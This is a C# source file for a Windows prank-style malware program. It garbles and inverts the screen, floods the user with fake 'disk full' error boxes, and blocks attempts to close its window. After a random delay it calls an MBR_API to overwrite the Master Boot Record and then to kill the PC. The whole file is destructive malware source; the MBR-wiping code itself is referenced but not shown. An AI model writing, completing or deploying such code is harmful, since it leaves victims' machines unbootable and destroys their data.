using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using System.Media;
using System.IO;

namespace ScreenFuck
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        public static Thread st;
        private void Form1_Load(object sender, System.EventArgs e)
        {
            // initialize payloads
            timer3.Interval = new Random().Next(180000, 540000);
            timer1.Start();
            timer2.Start();
            timer3.Start();
            // sound player
	    PlaySound(false);
        }

	public static void PlaySound(bool KillPC)
	{
	    Stream[] streams =
            {
                Properties.Resources.beat1,
                Properties.Resources.beat2,
                Properties.Resources.beat3,
                Properties.Resources.beat4,
                Properties.Resources.beat5,
                Properties.Resources.beat6
            };

	    st = new Thread(() =>
            {
                for (int i = 1; i < 3; i++)
                {
                    foreach (var stream in streams)
                     {
                         SoundPlayer sp = new SoundPlayer(stream);
                         sp.PlaySync();
                     }
                }
                if (KillPC)
		            MBR_API.KillPC();
            });
            st.Start();
	}
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            this.Hide();
            DialogResult dialog = MessageBox.Show("Trying to kill me ?", "ÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆ?", MessageBoxButtons.YesNo, MessageBoxIcon.Error);
            if (dialog == DialogResult.Yes)
            {
                MessageBox.Show("ɨ ǟʍ ɨʍʍօʀȶǟʟ", "YOUЯ C0WPuT3R 1S G0NƎ", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Warning);
            }
            this.Show();
            e.Cancel = true;
        }
        public static Cursor CreateCursor(Bitmap bm, Size size)
        {
            bm = new Bitmap(bm, size);
            return new Cursor(bm.GetHicon());
        }

        private void timer1_Tick(object sender, System.EventArgs e)
        {
            Random random = new Random();
            int num = random.Next(0, 150);
            int num1 = random.Next(0, 150);
            int num2 = random.Next(0, 150);
            int num3 = random.Next(0, 150);
            //random numbers
            try
            {
                Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Width);
                Graphics g = Graphics.FromImage(bmp);
                g.CopyFromScreen(num, num3, num1, num2, bmp.Size);
                g.CopyFromScreen(num3, num2, num, num1, bmp.Size);
                //get screenshot

                int width = random.Next(0, Screen.PrimaryScreen.Bounds.Width);
                int height = random.Next(0, Screen.PrimaryScreen.Bounds.Height);
                for (int y = 0; y < height; y++)
                {
                    for (int x = 0; x < width; x++)
                    {
                        Color p = bmp.GetPixel(x, y);


                        int a = p.A;
                        int r = p.R;
                        int gr = p.G;
                        int b = p.B;


                        r = 255 - r;
                        gr = 255 - gr;
                        b = 255 - b;


                        bmp.SetPixel(x, y, Color.FromArgb(a, r, gr, b));
                    }
                    pictureBox2.Location = Cursor.Position;
                    pictureBox1.Image = bmp;
                }
            }
            catch (Exception) { }
            //change every pixel until all the area becomes inverted and then put the screenshot on screen*/
            this.Cursor = CreateCursor((Bitmap)imageList1.Images[0], new Size(32, 32));//set cursor to error icon from imagelist
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            MessageBox.Show("Error 39 HANDLE_DISK_FULL\n The disk is full.");
        }
        bool runagain = false;
        private void timer3_Tick(object sender, EventArgs e)
        {
            if (!runagain)
            {
                this.Hide();
                timer1.Stop();
                timer2.Stop();
                try { st.Abort(); } catch (Exception) { }
                timer3.Interval = new Random().Next(120000, 600000);
            }
            else
            {
                this.Show();
                timer1.Start();
                timer2.Start();
                timer2.Interval = 10;
                timer3.Stop();
                //call code from api to damage MBR
                if (MBR_API.KillMBR())
                {
                    MessageBox.Show("MBR IS F'ed UP!", "ÆÆÆÆÆÆÆÆÆµ½¿Æ", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                }
		PlaySound(true);
            }
            runagain = true;
        }
    }
}
